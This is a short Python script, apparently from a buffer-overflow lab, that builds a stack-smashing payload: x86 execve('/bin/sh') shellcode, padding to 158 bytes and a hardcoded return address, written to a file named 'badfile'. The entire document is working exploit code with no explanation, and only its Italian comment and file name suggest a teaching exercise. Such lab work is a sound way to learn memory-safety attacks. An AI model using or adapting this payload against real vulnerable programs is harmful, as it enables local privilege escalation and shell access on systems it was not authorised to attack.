import struct 

shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
buffer1=0xbffff176

atk_vector = shellcode
atk_vector += '\0'
#bisogna riempire tutto buffer1
atk_vector += 'A'*(158 - len(atk_vector))
atk_vector += struct.pack('I', buffer1)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()
